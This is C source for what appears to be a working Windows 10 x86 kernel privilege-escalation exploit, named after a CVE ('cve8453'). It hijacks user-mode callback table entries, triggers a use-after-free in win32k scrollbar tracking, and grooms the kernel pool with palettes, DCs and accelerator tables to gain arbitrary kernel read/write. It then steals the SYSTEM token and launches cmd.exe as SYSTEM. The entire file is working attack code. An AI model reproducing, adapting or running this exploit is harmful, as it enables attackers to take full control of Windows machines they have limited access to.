#include "windows.h"
#include "stdafx.h"
#include "psapi.h"
#include "cve8453.h"

BOOL			bMSGSENT = FALSE;
HWND			hMainWND;
HWND			hSBWND;
HWND			hSBWNDnew;
DWORD			SystemCallStub;
CHAR			flag[0x80] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ze0r is so cool!";

HPALETTE		hManager;
HPALETTE		hWorker;
HPALETTE		hKeep;
HDC				hKeepDC = NULL;
PDWORD			CallbackTb = 0;
LPACCEL			lpAccel;

typedef VOID(WINAPI * fct_fnDispatch)(PDWORD msg);

fct_fnDispatch	fnDWORD;
fct_fnDispatch  fnClientFreeWindowClassExtraBytes;

typedef struct
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;

VersionSpecificConfig gConfig = { 0xb4, 0xfc }; // Win 10 15063 rs2 x86

LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

void SetWindowFNID(HWND hWnd, DWORD FNID) {
	__asm {
		mov		esi, esi;
		mov		eax, hWnd;
		push	FNID;
		push	eax;
		push	0;
		mov		eax, 0x1202;
		mov		edx, SystemCallStub;
		call	edx;
		add		esp, 0x0c;
	}
}

int SetLinkedUFIs(HDC hdc,int len) {
	int retvalue;
	__asm {
		push	len;
		lea     eax, flag;
		PUSH	eax;
		push	hdc;
		push	0;
		mov		eax, 0x1023;
		mov		edx, SystemCallStub;
		call	edx;
		add		esp, 0x10;
		mov		retvalue, eax;
	}
	return retvalue;
}

DWORD buf[0x240];

void ReadMem(DWORD Addr,DWORD len) {
	memset(buf, 0, 0x240 * 4);
	GetPaletteEntries(hManager, 0x2B, 50, (LPPALETTEENTRY)buf);
	buf[19] = Addr;
	SetPaletteEntries(hManager, 0x2B, 50, (LPPALETTEENTRY)buf);
	GetPaletteEntries(hWorker, 0, len, (LPPALETTEENTRY)buf);
}

ULONG GetNTOsBase()
{
	ULONG Bases[0x1000];
	DWORD needed = 0;
	ULONG krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID *)&Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

DWORD_PTR PsInitialSystemProcess(VOID)
{
	ULONG Module = (ULONG)LoadLibraryA("ntoskrnl.exe");
	ULONG Addr = (ULONG)GetProcAddress((HMODULE)Module, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)Module);
	ULONG res = 0;
	ULONG ntOsBase = GetNTOsBase();
	if (ntOsBase) {
		ReadMem(Addr - Module + ntOsBase, 16);
		res = buf[0];
	}
	return res;
}

ULONG PsGetCurrentProcess(DWORD sysEPS)
{
	ULONG pEPROCESS = sysEPS;
	ReadMem(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG), 16);
	while (TRUE) {
		pEPROCESS = buf[1] - gConfig.UniqueProcessIdOffset - sizeof(ULONG);
		ReadMem(pEPROCESS + gConfig.UniqueProcessIdOffset, 16);
		if (GetCurrentProcessId() == buf[0]) {
			return pEPROCESS;
		}
	}
}

DWORD_PTR GetKernelHandleTable(VOID)
{
	ULONG Module = (ULONG)LoadLibraryA("ntoskrnl.exe");
	ULONG Addr = (ULONG)GetProcAddress((HMODULE)Module, "KeServiceDescriptorTable");
	FreeLibrary((HMODULE)Module);
	ULONG res = 0;
	ULONG DestroyAcceleratorTableAddr = 0;
	ULONG HMValidateHandleAddr = 0;
	ULONG ntOsBase = GetNTOsBase();
	if (ntOsBase) {
		//虽然KeServiceDescriptorTableShadow未导出，但它位于KeServiceDescriptorTable - 0x40的地方。
		ReadMem(Addr - Module + ntOsBase - 0x40, 16 * 6);
		//获取win32k!NtUserDestroyAcceleratorTable函数地址
		ReadMem(buf[4] + 0x500, 16);
		ReadMem(buf[0] + 2, 16);
		//获取win32kfull!NtUserDestroyAcceleratorTable
		ReadMem(buf[0], 16);
		DestroyAcceleratorTableAddr = buf[0] + 0x18;
		//获取win32kfull!HMValidateHandle
		ReadMem(DestroyAcceleratorTableAddr, 16);
		//找到gpKernelHandleTable
		HMValidateHandleAddr = DestroyAcceleratorTableAddr + buf[0] + 4 + 0x39;
		ReadMem(HMValidateHandleAddr, 16);
		ReadMem(buf[0], 16);
		ReadMem(buf[0], 16);
		res = buf[0];
	}
	return res;
}

HPALETTE CreatePaletteOfSize(int size,DWORD value) {
	int pal_cnt = (size - 0x60) / 4;
	int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
	LOGPALETTE *lPalette = (LOGPALETTE*)malloc(palsize);
	memset(lPalette, value, palsize);
	lPalette->palNumEntries = pal_cnt;
	lPalette->palVersion = 0x300;
	return CreatePalette(lPalette);
}


HACCEL			hAccel_0xC10_top[2000];
HACCEL			hAccel_0x50_middle[3000];
HACCEL			hAccel_0x3B0_bottom[2000];
HACCEL			hAccel_ReusePalette[8000];
HDC				hDC_Writer[3000];
HPALETTE		hPalettes[10000];
void BeforSBTrackAlloc() {

	for (int i = 0; i < 3000; i++) {
		hDC_Writer[i] = CreateCompatibleDC(NULL);
	}

	for (int i = 0; i < 2000; i++) {
		hAccel_0xC10_top[i] = CreateAcceleratorTableW(lpAccel, 0x1FD);
	}

	for (int i = 0; i < 2000; i++) {
		hAccel_0x3B0_bottom[i] = CreateAcceleratorTableW(lpAccel, 0x95);
	}

	for (int i = 0; i < 3000; i++) {
		hAccel_0x50_middle[i] = CreateAcceleratorTableW(lpAccel, 8);
	}
	for (int i = 1000; i < 3000; i+=2) {
		DestroyAcceleratorTable(hAccel_0x50_middle[i]);
	}
}

void _cdecl AfterSBTrackAlloc() {
	for (int i = 0; i < 3000; i++) {
		DestroyAcceleratorTable(hAccel_0x50_middle[i]);
	}
	//发送消息,系统释放SBTrack;
	SendMessage(hSBWNDnew, WM_CANCELMODE, 0, 0);
	//释放0x3a0的占用空间,将0x3a0和上面的SBTrack(size=0x50)合并为0x3f0大小;
	for (int i = 0; i < 2000; i++) {
		DestroyAcceleratorTable(hAccel_0x3B0_bottom[i]);
	}

	for (int i = 0; i < 3000; i++) {
		SetLinkedUFIs(hDC_Writer[i],0x7D);
	}
}

void FindManagerAndWorker() {

	for (int i = 0; i < 2000; i++) {
		DestroyAcceleratorTable(hAccel_0xC10_top[i]);
	}
	for (int i = 0; i < 3000; i++) {
		hPalettes[i] = CreatePaletteOfSize(0xb30, 0x66);
	}
	for (int i = 0; i < 2000; i++) {
		hAccel_0x50_middle[i] = CreateAcceleratorTableW(lpAccel, 0x26);
	}
	for (int i = 3000; i < 10000; i++) {
		hPalettes[i] = CreatePaletteOfSize(0x100, 0x88);
	}
	free(lpAccel);

	*((DWORD *)flag) = 0x501;
	*((DWORD *)flag + 1) = 0xFFFF;
	for (int i = 0; i < 3000; i++) {
		SetLinkedUFIs(hDC_Writer[i], 1);
	}
	memset(buf, 0, 0x240 * 4);
	for (int i = 3000; i < 10000; i++) {
		if (GetPaletteEntries(hPalettes[i], 0x2B, 80, (LPPALETTEENTRY)buf)) {
			hKeep = hPalettes[i];
			hManager = (HPALETTE)*buf;
			hWorker = (HPALETTE)*(buf + 64);
			*(buf + 5) = 0xFFFF;
			*(buf + 69) = 0xFFFF;
			SetPaletteEntries(hPalettes[i], 0x2B, 80, (LPPALETTEENTRY)buf);
		}
	}

	*((DWORD *)flag) = 0x501;
	*((DWORD *)flag + 1) = 0x28;
	for (int i = 0; i < 3000; i++) {
		SetLinkedUFIs(hDC_Writer[i], 1);
		if (!hKeepDC && (!GetPaletteEntries(hKeep, 0x2B, 80, (LPPALETTEENTRY)buf))) {
			hKeepDC = hDC_Writer[i];
		}
	}
}

void GetSystem() {
	ULONG	SelfToken = 0;
	ULONG	SystemToken = 0;
	DWORD	ACCELHandle = 0;
	DWORD	SystemEPS;
	DWORD	CurrentEPS;
	DWORD	pKernelHandleTable;

	STARTUPINFO stStartUpInfo = { sizeof(stStartUpInfo) };
	PROCESS_INFORMATION pProcessInfo;
	WCHAR	cmd[] = L"c:\\\\windows\\\\system32\\\\cmd.exe";

	FindManagerAndWorker();
	SystemEPS = PsInitialSystemProcess();
	CurrentEPS = PsGetCurrentProcess(SystemEPS);
	pKernelHandleTable = GetKernelHandleTable();

	ReadMem(SystemEPS + gConfig.TokenOffset, 16);
	SystemToken = buf[0];
	GetPaletteEntries(hManager, 0x2B, 50, (LPPALETTEENTRY)buf);
	buf[19] = CurrentEPS + gConfig.TokenOffset;
	SetPaletteEntries(hManager, 0x2B, 50, (LPPALETTEENTRY)buf);

	GetPaletteEntries(hWorker, 0, 1, (LPPALETTEENTRY)&SelfToken);
	SetPaletteEntries(hWorker, 0, 1, (LPPALETTEENTRY)&SystemToken);

	Sleep(500);
	ZeroMemory(&stStartUpInfo, sizeof(STARTUPINFO));
	stStartUpInfo.cb = sizeof(STARTUPINFO);
	stStartUpInfo.dwFlags = STARTF_USESHOWWINDOW;
	stStartUpInfo.wShowWindow = 1;
	CreateProcess(cmd,NULL,NULL,NULL,FALSE,NULL,NULL,NULL,&stStartUpInfo,&pProcessInfo);
	Sleep(1000);
	SetPaletteEntries(hWorker, 0, 1, (LPPALETTEENTRY)&SelfToken);

	for (int i = 3000; i < 10000; i++) {
		if ((hPalettes[i] != hManager) && (hPalettes[i] != hWorker)) {
			DeleteObject(hPalettes[i]);
		}
	}
	for (int i = 0; i < 8000; i++) {
		hAccel_ReusePalette[i] = CreateAcceleratorTableW(lpAccel, 0x22);
	}

	GetPaletteEntries(hManager, 0x2B, 50, (LPPALETTEENTRY)buf);
	ReadMem(buf[20] - 0x1f0, 16);
	ACCELHandle = buf[0];
	GetPaletteEntries(hManager, 0x2B, 50, (LPPALETTEENTRY)buf);
	buf[19] = pKernelHandleTable + (ACCELHandle & 0xffff) * 8;
	SetPaletteEntries(hManager, 0x2B, 50, (LPPALETTEENTRY)buf);

	DeleteDC(hKeepDC);
	
	buf[0] = 0;
	buf[1] = 0;
	SetPaletteEntries(hWorker, 0, 2, (LPPALETTEENTRY)buf);
}

void fnDWORDCallBack(PDWORD msg) {

	if (bMSGSENT && *msg && (*((DWORD*)(*msg)) == (DWORD)hSBWND)) {
		bMSGSENT = FALSE;
		DestroyWindow(hMainWND);
	}

	//WM_TIMER标识ScrollBar已经开始循环处理消息，即强制退出xxxSBTrackLoop;
	if (*msg && *(msg + 1) == WM_TIMER) {
		SetCapture(hSBWNDnew);
	}

	if (*msg && (*(msg + 1) == 0x70) && (*((DWORD*)(*msg)) == (DWORD)hMainWND)) {
		_asm pushad;
		AfterSBTrackAlloc();
		_asm popad;
	}
	fnDWORD(msg);
}

void fnClientFreeWindowClassExtraBytesCallBack(PDWORD msg) {

	if ((HWND)*(msg + 3) == hMainWND) {
		hSBWNDnew = CreateWindowEx(0, L"ScrollBar", L"SB", SWP_HIDEWINDOW | SB_HORZ, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
		SetWindowFNID(hMainWND, 0x2A1);
		SetCapture(hSBWNDnew);
	}
	fnClientFreeWindowClassExtraBytes(msg);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hWnd, message, wParam, lParam);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{

	DWORD  OldProtect = 0;
	_asm {
		push eax;
		mov  eax, fs:[0x30];
		lea  eax, [eax + 0x2c];
		mov  eax, [eax];
		mov  CallbackTb, eax;
		pop  eax;
	}
	VirtualProtect(CallbackTb, 512, PAGE_READWRITE, &OldProtect);
	CallbackTb += 2;
	fnDWORD = (fct_fnDispatch)*CallbackTb;
	*CallbackTb = (DWORD)fnDWORDCallBack;

	CallbackTb += 126;
	fnClientFreeWindowClassExtraBytes = (fct_fnDispatch)*CallbackTb;
	*CallbackTb = (DWORD)fnClientFreeWindowClassExtraBytesCallBack;

	VirtualProtect(CallbackTb, 512, OldProtect, &OldProtect);
	SystemCallStub = (DWORD)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "KiFastSystemCall");
	lpAccel= (LPACCEL)malloc(sizeof(ACCEL) * 2);
	SecureZeroMemory(lpAccel, sizeof(ACCEL));

	WNDCLASSEXW wcex;
	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 1; 
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_CVE8453));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = L"WNDCLASSMAIN";
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	RegisterClassExW(&wcex);
	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_CVE8453));

	hMainWND = CreateWindowW(L"WNDCLASSMAIN", L"CVE", WS_DISABLED , 0, 0, 0, 0,nullptr, nullptr, hInstance, nullptr);

	hSBWND = CreateWindowEx(0, L"ScrollBar", L"SB", WS_CHILD | WS_VISIBLE | SBS_HORZ, 0, 0, 3, 3, hMainWND, NULL, hInstance, NULL);
	SetScrollRange(hSBWND, SB_CTL, 0, 3, TRUE);
	SetScrollPos(hSBWND, SB_CTL, 3, TRUE);
	ShowWindow(hMainWND, SW_SHOW);
	UpdateWindow(hMainWND);

	///////////////////////////////////////////////////////////////////////////////////
	//多占用句柄，避免之后的池风水会被分配2级句柄表所打乱布局
	for (int i = 0; i < 10000; i++) {
		hPalettes[i] = CreatePaletteOfSize(0x100, 0x11);
	}
	for (int i = 9990; i >= 0; i--) {
		DeleteObject(hPalettes[i]);
	}
	///////////////////////////////////////////////////////////////////////////////////

	BeforSBTrackAlloc();
	bMSGSENT = TRUE;
	SendMessage(hSBWND, WM_LBUTTONDOWN, 0, 0x00020002);

	GetSystem();

    return TRUE;
}
